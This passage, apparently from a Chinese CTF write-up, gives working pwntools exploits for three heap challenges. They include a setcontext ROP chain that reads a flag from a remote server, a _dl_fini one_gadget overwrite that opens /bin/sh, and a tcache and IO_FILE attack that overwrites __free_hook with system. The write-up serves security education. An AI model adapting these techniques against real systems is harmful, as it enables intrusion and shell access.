        get('/?request=get_data&index=' + str(i))
        ru('HTTP/1.1 200 OK')
    #--------------------------exploit--------------------------    def exploit():
        li('exploit...')
        add(0, 0x400, b'') # 0
        add(0x31, 0x37c, b'') # for bypass unsorted bin malloc 
        add(0x32, 0x37c, b'') # for bypass unsorted bin malloc
        add(0x33, 0x348, b'') # for bypass unsorted bin malloc
        add(0x34, 0x331, b'') # for bypass unsorted bin malloc
        add(0x35, 0x331, b'') # for bypass unsorted bin malloc
        rm(0x31)
        rm(0x32)
        rm(0x33)
        rm(0x34)
        rm(0x35)
        for i in range (16):
            add(i, 0x100, b'') # 1
        for i in range (7):
            rm(i + 1)
        rm(8)
        add(8, 0x401, b'')
        add(2, 0x401, b'')
        # leak libc
        get_data(8)
        ru('"data":"')
        leak = u64(io.recv()[-8:-2].ljust(8, b'\x00'))
        main_arena_offset = 0x1ebb80
        libc_base = leak - main_arena_offset - 96
        main_arena = libc_base + main_arena_offset
        free_hook = libc_base + libc.sym['__free_hook']
        setcontext = libc_base + libc.sym['setcontext'] + 61
        gadget = libc_base + 0x1547A0 # local
        gadget = libc_base + 0x154930 # remote
        ret_addr = libc_base + 0x25679
        libc_open = libc_base + libc.sym['open']
        libc_read = libc_base + libc.sym['read']
        libc_write = libc_base + libc.sym['write']
        pop_rdi = libc_base + 0x26b72
        pop_rsi = libc_base + 0x27529
        pop_rdx_r12 = libc_base + 0x11c1e1 # local
        pop_rdx_r12 = libc_base + 0x11c371 # remote
        li('libc_base : ' + hex(libc_base))
        # leak heap
        get_data(2)
        ru('"data":"')
        leak = u64(io.recv()[-8:-2].ljust(8, b'\x00'))
        heap = leak - (0)
        li('heap chunk 2 : ' + hex(heap))
        rm(9) # for merge
        rm(10) # for merge
        for i in range (6):
            add(i + 0x10, 0x100, b'') # 1
        rm(8) # free our large chunk
        add(9, 0x401, b'')
        rm(9) # add out fake chunk to tcache list
        #rop = flat();
        set_context = p64(0) * 4 # rdx -> addr
        set_context += p64(setcontext) # rdx + 0x20
        set_context += p64(0x11111)
        set_context = set_context.ljust(0xa0, b'\x00')
        set_context += p64(heap + 0x880 + 0x110) # set rsp, point to rop
        set_context += p64(ret_addr) # set rcx, avoid push rcx impact on rsp
        set_context += b'./flag\x00'
        flag_addr = heap + 0x888 + 0xa0 + 0x10
        rop = flat([
            pop_rdi, flag_addr,     
            pop_rsi, 0,
            libc_open,
            pop_rdi, 3,
            pop_rsi, flag_addr,
            pop_rdx_r12, 0x100, 0,
            libc_read,
            pop_rdi, 1,
            pop_rsi, flag_addr,
            #pop_rdx_r12, 0x100, 0,
            libc_write,
        # pause
            pop_rdi, 0,
            libc_read
        ])
        p = p64(main_arena + 96) + p64(main_arena + 96)
        p = p.ljust(0x100, b'\x00')
        p += p64(0) + p64(0x111) # fake chunk 9
        p += (p64(free_hook) + set_context).ljust(0x100, b'\x00')
        p += p64(0) + p64(0x111) # fake chunk 10
        p += rop.ljust(0x100, b'\x00')
        p += b'A' * 0x10 # avoid string obj malloc to our fake chunk
        add(0x20, 0x320, p) # malloc to our chunk, and make a fake chunk
        add(0x21, 0x100, b'')
        p = p64(gadget)
        p += p64(heap + 0x888) # set rdx pointer to heap set_context addr + 0x20
        #db()
        # trigger
        post('/?request=add_data&index=' + str(0x22) + '&size=' + str(0x100), p)
    def finish():
        ia()
        c()
    #--------------------------main-----------------------------    if __name__ == '__main__':
        if LOCAL:
            elf = ELF(elf_path)
            if LIBC:
                libc = ELF(libc_path)
                io = elf.process(env = {"LD_PRELOAD" : libc_path} )
            else:
                io = elf.process()
        else:
            elf = ELF(elf_path)
            io = remote(server_ip, server_port)
            if LIBC:
                libc = ELF(libc_path)
        exploit()
        finish()
#### attack log
    ┌[logan☮arch]-(~/share/axb2020-server-mannage/pwn_chall/test/lgx-data-platform)
    └> ./exp
    [*] '/run/media/logan/disk1/share/axb2020-server-mannage/pwn_chall/test/lgx-data-platform/lgx-data-platform'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Opening connection to axb.d0g3.cn on port 20101: Done
    [*] '/run/media/logan/disk1/share/axb2020-server-mannage/pwn_chall/test/lgx-data-platform/libc.so.6'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] exploit...
    [*] libc_base : 0x7f0929101000
    [*] heap chunk 2 : 0x56151b60e090
    [*] Switching to interactive mode
    Server: LGX_SERVER 
    Access-Control-Allow-Origin: *
    Content-Type: application/json
    Content-Length: 43
    {"code":"true", "msg":"warning none data!"}flag{722b6d90a64c25782af42d14d784ce1c}
## Einstein
#### 分析
该题首先是个逻辑漏洞,可以导致uaf泄露出main_arena,从而泄露出libc的基地址
其次,由于只能任意地址写三个字节,所以只能靠exit函数_dl_fini+126处的调用来写入(one_gadget)三个字节,这里有可能出现无法写入one_gadget完整的情况,所以该题的exp,打这个题目,是有一定的成功率的...一般来说,尝试三次,就可以成功
#### 详解
首先是泄露libc的基地址,这里uaf的常见套路了
只要name和passwd不等于admin就行了
    payload = '{"name":"xxxxx","passwd":"xxxxx"}'
    io.sendline(payload)
    io.recvuntil('logger:spring login error!\nlogger:')
    lib_main = u64(io.recvuntil(' login', drop=True).ljust(8, '\x00'))
    print 'lib_main_arena is ',hex(lib_main)
    libc_base = lib_main - 88 - 0x3c4b20
    print 'libc_base is ',hex(libc_base)
然后是重点exit函数的利用了,网上有很多该函数的利用教程,但是这里由于我增加了libm库,所以具体的偏移量需要自己调试,直接照抄网上的偏移,是不可能成功的
那么调试exit,si单步调试
其中部分内容如下:
si进入exit函数(这里会直接进入_dl_runtime_resolve_xsavec),然后跳过第一个_dl_fixup函数,找到__run_exit_handlers函数,继续进入,找到了_call_tls_dtors进入这个函数
这里有个call rdx(0x7ffff7de7af0),直接进入_dl_fini
    0x7ffff7de7b6e     call   qword ptr [rip + 0x2163d4] 
            rdi: 0x7ffff7ffd948 (_rtld_global+2312) ◂— 0x0
            rsi: 0x1
            rdx: 0x7ffff7de7af0 (_dl_fini) ◂— push   rbp
            rcx: 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe168 ◂— 0x0
       0x7ffff7de7b74     mov    ecx, dword ptr [r12]
       0x7ffff7de7b78     test   ecx, ecx
       0x7ffff7de7b7a     je     _dl_fini+80 
       0x7ffff7de7b7c     mov    rax, qword ptr [r12 - 8]
       0x7ffff7de7b81     movzx  edx, byte ptr [rax + 0x315]
这里我们使用pwndbg计算,偏离量,0x7ffff7dd7c90-libc_base
这样子我们就可以在该地址上写入3个字节,从而实现控制了exit函数的流程
#### exp
    #-*- coding:utf-8 –*-    from pwn import *
    context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    elfFileName = "./sfs"
    libcFileName = ""
    ip = "0.0.0.0"
    port = 10003
    Debug = 0
    if Debug:
        io = process(elfFileName)
        gdb.attach(io)
    else:
        io = remote(ip,port)
    #
    io.recvuntil('passwd.\n')
    payload = '{"name":"xxxxx","passwd":"xxxxx"}'
    io.sendline(payload)
    io.recvuntil('logger:xxxxx login error!\nlogger:')
    lib_main = u64(io.recvuntil(' login', drop=True).ljust(8, '\x00'))
    print 'lib_main_arena is ',hex(lib_main)
    libc_base = lib_main - 88 - 0x3c4b20
    print 'libc_base is ',hex(libc_base)
    #
    target = libc_base + 0x8f9f48#0x3f1000+0xf08#0x5f0f48
    one_gadget = libc_base + 0xf02a4#0xf1147#0x4526a#0x45216#0xf02a4
    print 'target is ',hex(target)
    print 'one_gadget is ',hex(one_gadget)
    sleep(0.1)
    for i in range(3):
        io.send(p64(target + i))
        sleep(0.1)
        io.send(p64(one_gadget)[i])
        sleep(0.1)
    #io.recv()
    io.sendline("exec /bin/sh")
    io.interactive()
## IO_FILE
#### 思路
存在UAF漏洞，double free tcache_attack攻击IO_FILE之后，泄露libc，再double free
tacche_attack修改free_hook为system
#### exp
    from pwn import *
    context.log_level='debug'
    context.terminal=['deepin-terminal', '-x', 'sh' ,'-c']
    elf=ELF("./IO_FILE")
    #p=process("./IO_FILE")
    p=remote("127.0.0.1", 20002)
    libc=ELF("./libc.so.6")
    def add(size,des):
        p.recvuntil(">")
        p.sendline("1")
        p.recvuntil("size:")
        p.sendline(str(size))
        p.recvuntil("ion:")
        p.send(des)
    def dele(idx):
        p.recvuntil(">")
        p.sendline("2")
        p.recvuntil("index:")
        p.sendline(str(idx))
    add(0x60,'aaa')
    dele(0)
    dele(0)
    add(0x60,p64(0x602080))
    add(0x60,'\x60')
    add(0x60,'\x60')
    payload=p64(0xfdab1800)+p64(0)*3+'\x00'
    add(0x60,payload)
    leak_vtable=u64(p.recvuntil("exit")[0x58:0x60])
    libc_base=leak_vtable-libc.symbols["_IO_file_jumps"]
    free_hook=libc_base+libc.symbols["__free_hook"]
    system=libc_base+libc.symbols["system"]
    add(0x70,"aaa")
    dele(5)
    dele(5)
    add(0x70,p64(free_hook))
    add(0x70,"/bin/sh")
    add(0x70,p64(system))
    dele(7)
    #gdb.attach(p)
    p.interactive()